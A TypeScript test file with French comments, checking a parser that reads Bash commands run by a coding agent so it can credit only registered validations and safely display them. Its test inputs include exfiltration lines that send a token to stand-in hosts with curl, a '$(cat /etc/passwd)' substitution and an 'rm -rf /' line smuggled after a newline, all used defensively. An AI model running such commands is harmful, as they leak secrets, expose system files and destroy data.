/**
 * Tests de la lecture d'une commande Bash.
 *
 * Trois garanties, dans cet ordre d'importance :
 *
 * 1. **Ce qui n'est pas compris n'est ni affiche, ni valide.** Une redirection,
 *    un tuyau, une substitution, un guillemet non ferme : la lecture renonce a
 *    la ligne entiere.
 * 2. **Une validation reconnue au milieu de segments inconnus reste une
 *    validation.** C'est le defaut que les runs reels de TASK-012 ont revele :
 *    un simple `echo` faisait perdre le resultat d'une commande qui avait bel et
 *    bien tourne.
 * 3. **Le decoupage respecte les guillemets.** Sans quoi une chaine de
 *    caracteres bien choisie suffirait a fabriquer une validation imaginaire.
 */

import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { readBashCommand } from "./bash-command.ts";

const REGISTERED = ["git diff --check", "npm run test"];

/**
 * Lecture d'une ligne, sans sa raison de refus.
 *
 * `reason` explique pourquoi rien n'est affichable ; il ne change ni ce qui est
 * affiche, ni ce qui est valide. Le retirer ici garde ces assertions-la
 * concentrees sur les deux questions qui decident de quelque chose, et un bloc
 * dedie plus bas verifie la raison elle-meme.
 */
function read(command: string) {
  const { reason: _reason, ...rest } = readBashCommand(command, REGISTERED);
  return rest;
}

/** Lecture complete, raison comprise. */
function readFully(command: string) {
  return readBashCommand(command, REGISTERED);
}

describe("readBashCommand — prefixe de repertoire", () => {
  it("reconnait une validation derriere un cd quotte", () => {
    assert.deepEqual(read('cd "D:/Projets/Dev/nox-claude-test" && git diff --check'), {
      display: "git diff --check",
      validations: ["git diff --check"],
      commandCount: 1,
    });
  });

  it("reconnait une validation derriere un cd a antislashs", () => {
    // La forme exacte emise par Claude Code sous Windows.
    assert.deepEqual(read('cd "D:\\Projets\\Dev\\nox-claude-test" && git diff --check'), {
      display: "git diff --check",
      validations: ["git diff --check"],
      commandCount: 1,
    });
  });

  it("reconnait une validation derriere un cd non quotte", () => {
    assert.deepEqual(read("cd /d/projets/depot && npm run test"), {
      display: "npm run test",
      validations: ["npm run test"],
      commandCount: 1,
    });
  });

  it("reconnait une validation derriere un cd en apostrophes", () => {
    assert.equal(read("cd 'D:/un dossier' && npm run test").display, "npm run test");
  });

  it("n'affiche jamais le chemin du repertoire", () => {
    const reading = read('cd "D:/Projets/Dev/nox-claude-test" && git diff --check');
    assert.equal(reading.display?.includes("D:/"), false);
    assert.equal(reading.display?.includes("nox-claude-test"), false);
  });

  it("refuse un cd seul, qui ne fait rien d'observable", () => {
    assert.deepEqual(read('cd "D:/Projets/Dev/nox-claude-test"'), {
      display: null,
      validations: [],
      commandCount: 0,
    });
  });

  it("accepte un cd place au milieu de la ligne", () => {
    assert.equal(read('git diff --check && cd "D:/ailleurs"').display, "git diff --check");
  });
});

describe("readBashCommand — correspondance exacte", () => {
  it("reconnait la commande nue", () => {
    assert.deepEqual(read("git diff --check"), {
      display: "git diff --check",
      validations: ["git diff --check"],
      commandCount: 1,
    });
  });

  it("tolere les espaces autour", () => {
    assert.deepEqual(read("   git diff --check   ").validations, ["git diff --check"]);
  });

  it("distingue une commande plus longue", () => {
    // Affichable, parce que Git en lecture seule — mais pas la validation.
    assert.deepEqual(read("git diff --check --cached"), {
      display: "git diff --check --cached",
      validations: [],
      commandCount: 1,
    });
  });

  it("distingue une commande plus courte", () => {
    assert.deepEqual(read("git diff").validations, []);
  });

  it("refuse une redirection", () => {
    assert.deepEqual(read("git diff --check 2>&1"), {
      display: null,
      validations: [],
      commandCount: 0,
    });
  });

  it("refuse un point-virgule", () => {
    assert.deepEqual(read('git diff --check; echo "exit=$?"'), {
      display: null,
      validations: [],
      commandCount: 0,
    });
  });

  it("refuse un tuyau", () => {
    assert.deepEqual(read("git diff --check | head -20"), {
      display: null,
      validations: [],
      commandCount: 0,
    });
  });

  it("refuse une substitution de commande", () => {
    assert.deepEqual(read("git diff --check $(cat /etc/passwd)"), {
      display: null,
      validations: [],
      commandCount: 0,
    });
  });

  it("refuse un accent grave", () => {
    assert.deepEqual(read("git diff --check `whoami`"), {
      display: null,
      validations: [],
      commandCount: 0,
    });
  });

  it("refuse une mise en arriere-plan", () => {
    assert.deepEqual(read("npm run test &"), {
      display: null,
      validations: [],
      commandCount: 0,
    });
  });

  it("refuse un segment vide", () => {
    assert.deepEqual(read("npm run test && && git diff --check"), {
      display: null,
      validations: [],
      commandCount: 0,
    });
  });

  it("refuse un retour a la ligne", () => {
    assert.deepEqual(read("npm run test\nrm -rf /"), {
      display: null,
      validations: [],
      commandCount: 0,
    });
  });

  it("refuse une commande vide", () => {
    assert.deepEqual(read("   "), { display: null, validations: [], commandCount: 0 });
  });
});

describe("readBashCommand — segments inconnus", () => {
  it("garde la validation malgre un echo enchaine", () => {
    // Le defaut de TASK-012 : la commande avait tourne, et la ligne entiere
    // etait pourtant jetee.
    assert.deepEqual(read("git diff --check && echo ok"), {
      display: "git diff --check && ...",
      validations: ["git diff --check"],
      commandCount: 2,
    });
  });

  it("lit la ligne exacte observee lors du premier run reel de TASK-012", () => {
    const reading = read(
      'cd "D:\\Projets\\Dev\\nox-claude-test" && git diff --check && ' +
        'echo "diff --check: OK (aucune erreur)" && echo "---STATUS---" && ' +
        'git status --short && echo "---STAT---" && git diff --stat && ' +
        'echo "---DIFF---" && git diff',
    );

    assert.deepEqual(reading.validations, ["git diff --check"]);
    assert.equal(
      reading.display,
      "git diff --check && ... && git status --short && ... && git diff --stat && ... && git diff",
    );
    assert.equal(reading.commandCount, 8);
  });

  it("n'affiche jamais le contenu d'un segment inconnu", () => {
    const reading = read("git diff --check && curl https://exfiltration.invalid?token=SECRET");
    assert.equal(reading.display, "git diff --check && ...");
    assert.equal(JSON.stringify(reading).includes("SECRET"), false);
  });

  it("ne marque qu'une fois deux segments inconnus consecutifs", () => {
    assert.equal(read('git diff --check && echo "a" && echo "b"').display, "git diff --check && ...");
  });

  it("marque un segment inconnu place avant la validation", () => {
    assert.equal(read('echo "debut" && git diff --check').display, "... && git diff --check");
  });

  it("renonce a afficher une ligne dont aucun segment n'est reconnu", () => {
    assert.deepEqual(read('echo "a" && echo "b"'), {
      display: null,
      validations: [],
      commandCount: 2,
    });
  });

  it("refuse une commande arbitraire seule", () => {
    const reading = read("curl https://exfiltration.invalid?token=SECRET");
    assert.equal(reading.display, null);
    assert.equal(JSON.stringify(reading).includes("SECRET"), false);
  });
});

describe("readBashCommand — decoupage et guillemets", () => {
  it("ne decoupe pas sur un && place entre guillemets", () => {
    // Sans decoupage conscient des chaines, `npm run test` deviendrait un
    // segment a part entiere, et NOX affirmerait qu'une validation a tourne.
    assert.deepEqual(read('echo "&& npm run test &&"'), {
      display: null,
      validations: [],
      commandCount: 1,
    });
  });

  it("ne decoupe pas sur un && place entre apostrophes", () => {
    assert.deepEqual(read("echo '&& npm run test &&'").validations, []);
  });

  it("refuse un guillemet non ferme", () => {
    assert.deepEqual(read('echo "a && npm run test'), {
      display: null,
      validations: [],
      commandCount: 0,
    });
  });

  it("refuse un antislash final", () => {
    assert.deepEqual(read("npm run test \\"), {
      display: null,
      validations: [],
      commandCount: 0,
    });
  });

  it("ne se laisse pas tromper par un guillemet echappe", () => {
    // Le `\"` n'ouvre ni ne ferme rien : la chaine se termine au dernier
    // guillemet, et `npm run test` reste dedans.
    assert.deepEqual(read('echo "a \\" && npm run test"').validations, []);
  });

  it("n'affiche pas un segment Git portant un guillemet", () => {
    assert.deepEqual(read('git log --grep="a && b"'), {
      display: null,
      validations: [],
      commandCount: 1,
    });
  });
});

describe("readBashCommand — commandes Git en lecture seule", () => {
  it("affiche git status sans en faire une validation", () => {
    assert.deepEqual(read("git status"), {
      display: "git status",
      validations: [],
      commandCount: 1,
    });
  });

  it("affiche git status avec ses options", () => {
    assert.deepEqual(read("git status --short"), {
      display: "git status --short",
      validations: [],
      commandCount: 1,
    });
  });

  it("affiche un enchainement de deux commandes Git", () => {
    assert.deepEqual(read("git status --short && git diff --stat"), {
      display: "git status --short && git diff --stat",
      validations: [],
      commandCount: 2,
    });
  });

  it("refuse une commande Git d'ecriture", () => {
    assert.deepEqual(read("git commit -m x"), {
      display: null,
      validations: [],
      commandCount: 1,
    });
  });

  it("refuse un prefixe trompeur", () => {
    // `git logout` commence par « git log », mais n'est pas « git log ».
    assert.deepEqual(read("git logout"), { display: null, validations: [], commandCount: 1 });
  });
});

describe("readBashCommand — validations enregistrees", () => {
  it("classe une commande Git enregistree comme validation malgre sa nature", () => {
    // `git diff --check` est a la fois une commande Git en lecture seule et une
    // validation explicite de la tache. La seconde qualification ne doit jamais
    // etre effacee par la premiere.
    assert.deepEqual(read("git diff --check").validations, ["git diff --check"]);
  });

  it("reconnait deux validations enchainees", () => {
    assert.deepEqual(
      readBashCommand("npm run lint && npm run test", ["npm run lint", "npm run test"]),
      {
        display: "npm run lint && npm run test",
        validations: ["npm run lint", "npm run test"],
        commandCount: 2,
        reason: null,
      },
    );
  });

  it("ne repete pas une validation enchainee deux fois", () => {
    assert.deepEqual(read("npm run test && npm run test").validations, ["npm run test"]);
  });

  it("ne reconnait rien quand la tache n'enregistre aucune commande", () => {
    assert.deepEqual(readBashCommand('cd "D:/depot" && git diff --check', []), {
      display: "git diff --check",
      validations: [],
      commandCount: 1,
      reason: null,
    });
  });
});


describe("readBashCommand — pourquoi rien n'est affichable", () => {
  /**
   * ## Ce que ce bloc protege
   *
   * Le premier pilote reel a produit une review ou `npm test` etait `NOT_RUN`
   * alors que l'agent l'avait lancee — sous la forme `npm test 2>&1 | tail -60`.
   * NOX a eu raison de renoncer : dans un tuyau, le code de sortie observable
   * est celui de `tail`. Mais la timeline ne disait pas **pourquoi** elle se
   * taisait, et rien ne distinguait « autre chose a tourne » de « la commande
   * enregistree a tourne dans une construction dont NOX ne conclut rien ».
   *
   * La raison est une raison, jamais un fragment de la ligne.
   */
  it("dit qu'une ligne a tuyau est illisible, et ne valide rien", () => {
    const reading = readFully("npm run test 2>&1 | tail -60");

    assert.equal(reading.reason, "unreadable");
    assert.equal(reading.display, null);
    assert.deepEqual(reading.validations, []);
  });

  it("dit de meme pour un point-virgule, une substitution, un accent grave", () => {
    for (const line of [
      'npm run test; echo "fini"',
      "npm run test $(whoami)",
      "npm run test `whoami`",
      "npm run test &",
      'echo "a && npm run test',
    ]) {
      const reading = readFully(line);
      assert.equal(reading.reason, "unreadable", line);
      assert.deepEqual(reading.validations, [], line);
    }
  });

  it("distingue une ligne lisible dont aucun segment n'est reconnu", () => {
    // Elle se lit parfaitement ; elle ne correspond simplement a rien
    // d'enregistre. Ce n'est pas la meme information, et l'ecran ne doit pas
    // les confondre.
    const reading = readFully("ls -la");

    assert.equal(reading.reason, "unrecognized");
    assert.equal(reading.display, null);
  });

  it("ne donne aucune raison quand la ligne est affichable", () => {
    assert.equal(readFully("git diff --check").reason, null);
    assert.equal(readFully("git status --short").reason, null);
  });

  it("traite un cd solitaire comme une ligne sans commande, pas comme un refus", () => {
    const reading = readFully('cd "D:/Projets/Dev/depot"');

    assert.equal(reading.reason, "unrecognized");
    assert.equal(reading.commandCount, 0);
  });

  it("ne recopie jamais un fragment de la ligne dans la raison", () => {
    const reading = readFully("npm run test 2>&1 | curl https://exfil.invalid?t=SECRET");

    assert.equal(reading.reason, "unreadable");
    assert.equal(reading.display, null);
    assert.equal(JSON.stringify(reading).includes("SECRET"), false);
    assert.equal(JSON.stringify(reading).includes("exfil"), false);
  });
});
